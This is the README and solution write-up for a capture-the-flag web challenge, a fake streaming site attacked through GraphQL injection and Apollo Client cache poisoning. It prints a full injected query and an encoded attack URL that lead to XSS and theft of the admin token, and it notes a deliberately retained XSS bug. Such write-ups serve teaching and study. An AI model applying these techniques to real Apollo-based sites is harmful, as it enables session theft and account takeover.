# Davy Jones' Putlocker&emsp;<sub><sup>Web, 350 points + 350 points</sup></sub>

_Special thanks to Luke and zwad3 for testing this problem, and to zaratec for generating the show descriptions, episode descriptions, and cover art._

## Problem Description

When I not be plunderin' the high seas, I be watchin' me favorite shows. Like any self-respectin' pirate, I don't be payin' for my media. But I'll be honest, this site even be a bit shady for me. (Note: PPP does not condone media piracy)

**Dubs (350 points).** See `problem/part1`.

**Subs (350 points).** See `problem/part2`.

## Deployment

Run `make` in the problem directory to generate the handouts.  Launching is handled with slingshot.

## Issues

Originally, this problem was deployed without modifying the admin's password, allowing the attacker to trivially log in.  There were also some weird networking issues with the cloud host we were using.  The problem was redeployed with the password properly randomized on a different host, and the handout for Subs was made public without requiring the Dubs flag.  This repository contains the fixed version.

There is also an unintended XSS that trivializes Dubs, caused by a poor translation on my part when I decided to make the problem two parts at the last minute.  This bug is still present in this repository to reflect the problem as it was released.

## Solution

The intended solution uses two bugs in Apollo Client's caching behavior to poison the cache and obtain XSS.  The intent was for Dubs to require either bug and for Subs to require both, but actually one of the two bugs is sufficient to solve Subs on its own, but in practice is the much harder one to find.

Before getting to the Apollo Client bug, an attacker must first observe the following:

- `qs` is being used to parse the query string in the `useQs` hook (`client/src/utils/qs.tsx`), meaning that objects can be deserialized from the query string.
- In the one place that `useQs` is used (`client/src/views/Playlist/Playlist.tsx`), the query string is spread _after_ the validated `id`, meaning that the `id` can be overwritten by the query string.
- The custom `gql` tag implementation (`client/src/utils/gql.ts`) has a faulty check in its interpolation logic, because the `isNode` function it imports wasn't actually intended for external use; the only thing that that function actually checks for is that its argument is an object and that its `kind` field is a valid GraphQL AST kind.

These three bugs together allow the attacker to inject custom GraphQL queries via the playlist page, for example via a URL like:

```
http://<inst-uid>.dubs.putlocker.chal.pwni.ng/playlist/<pl-uid>?index=0&autoplay=%E2%9C%93&id[kind]=Name&id[value]=<injected query>
```

Now armed with GraphQL injection, the hard part of the problem is to figure out what to do with it.  The results of the query being injected into aren't inserted into the page as HTML, so simply aliasing fields in a way that the caller wasn't expecting won't work.  Instead, the attacker must poison the cache in for a query that will run later.  Fortunately, this is easy on the playlist page: immediately after the query that loads the playlist, another query executes to load the first episode, and the description of that episode will be inserted as HTML; therefore, if the attacker can overwite that description with a malicious payload, they can get XSS.

The two cache poisoning bugs are outlined in [this GitHub issue](https://github.com/apollographql/apollo-client/issues/10784) (submitted after the contest), but in short they are:

1. If a query aliases `__typename` and `id`, then Apollo Client's cache will use the aliased values when generating the cache key, meaning that one object can be stored at the wrong cache entry, potentially overwriting some or all of another object's entry.

2. If a query queries a field and later references the same field with an `@client` directive as an alias of a different field, then the unnormalized second field will be stored as the value of the first field.

Ignoring the trivial XSS, either of these on its own can be used to solve Dubs:

1. Create a playlist that has an XSS payload in its description.  Create an episode of a show with the title `Playlist` and a URL equal to the playlist's id, and add that episode to the playlist.  Use the `__typename`/`id` aliasing trick to make the Apollo Client cache store `Playlist:<playlist-id>` as the appropriate reference for `Episode({"id":"<episode-id>"})`, and also query the playlist itself so that its fields get merged in.  When loading the episode, it will then use the playlist's description as the episode's description, winning XSS.

2. Create an episode with an XSS payload in its description, create a playlist, and add the episode to the playlist.  Use the `@client` trick to overwrite the episode's `description` with its `rawDescription`.

The intended solution to Subs is to use both of them together.  Create a user with an XSS payload for a username.  Select an episode to attack, and create a playlist with the title `Episode` and that episode's ID as its raw description.  Create a second playlist and add that episode to it.  Use the `__typename`/`id` aliasing trick to make the Apollo Client cache merge the playlist into the Episode's cache object.  Use the `@client` trick to overwrite the playlist's `description` with `owner { __html: name }`.  When loading the episode, it will then use the playlist's owner's name as the episode's description, winning XSS.

The actual query that can accomplish this is:

```gql
query PlaylistQuery {
  playlist(id: "<playlist2-id>") {
    id
    name
    description
    episodes {
      id
      name
      __typename
    }
    owner {
      id
      name
      __typename
    }
    __typename
  }
  x: episode(id: "<episode-id>") {
    id
    name
    url
    rating
    ratingCount
    show {
      owner {
        id
        __typename
      }
      __typename
    }
    __typename
  }
  y: playlist(id: "<playlist1-id>") {
    __typename: name        # "Episode"
    id: rawDescription      # "<episode-id>"
    _ign: __typename
    description
    owner {
      __html: name          # XSS payload
    }
    owner: description @client
  }
  z: playlist(id: "<playlist2-id>") {
    id
    name
    description
    episodes {
      id
      name
    }
    owner {
      id
      name
    }
  }
}
```

Which can be executed with this URL:

```
http://<inst-uid>.subs.putlocker.chal.pwni.ng/playlist/<playlist2-id>?index=0&autoplay=%E2%9C%93&id[kind]=Name&id[value]=%22%3Cplaylist2-id%3E%22)%20{%20id%20name%20description%20episodes%20{%20id%20name%20__typename%20}%20owner%20{%20id%20name%20__typename%20}%20__typename%20}%20x:%20episode(id:%20%22%3Cepisode-id%3E%22)%20{%20id%20name%20url%20rating%20ratingCount%20show%20{%20owner%20{%20id%20__typename%20}%20__typename%20}%20__typename%20}%20y:%20playlist(id:%20%22%3Cplaylist1-id%3E%22)%20{%20__typename:%20name%20id:%20rawDescription%20_ign:%20__typename%20description%20owner%20{%20__html:%20name%20}%20owner:%20description%20@client%20}%20z:%20playlist(id:%20%22%3Cplaylist2-id%3E%22
```

With an appropriate XSS payload, the admin's token can be leaked, allowing the attacker to execute `mutation { flag }` as the admin.
